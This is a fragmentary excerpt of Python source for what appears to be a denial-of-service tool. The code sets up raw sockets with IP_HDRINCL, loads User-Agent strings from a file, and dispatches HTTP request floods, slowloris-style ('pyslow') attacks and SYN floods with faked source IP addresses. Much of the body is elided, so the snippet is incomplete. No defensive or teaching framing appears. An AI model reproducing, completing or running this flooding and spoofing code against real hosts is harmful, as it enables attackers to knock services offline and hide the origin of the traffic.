...
import re
import os
from socket import AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, SOCK_RAW, SOCK_STREAM, gethostbyname, htons, inet_aton, socket
...
def add_useragent():
	try:
		with open("./_ua.txt","r") as fp:
			uagents = re.findall(r"(.+)\n",fp.read())
	except FileNotFoundError:
		cprint('[-] No file named \'_ua.txt\',failed to load User-Agents','yellow')
		return []
	return uagents
...
def actual_main(start_ts,soc_timout,threads,port,sleep_time,src_ip=False,tgt_ip=False,request_atk=False,pyslow_atk=False,synflood_atk=False,faked_ip=False):
	if tgt_ip == False:
		sys.exit()
	...
	if synflood_atk:
		...
		while convert_sec_to_milli(time.time()) < start_ts + soc_timout:
			if src_ip == False:
				faked_ip = True
				if faked_ip == True:
					ip = fake_ip()
		...
		while 1:
			try:
				...
				sys.exit(cprint('[-] Canceled by user','red'))
	if not (synflood_atk) and not (request_atk) and not (pyslow_atk):
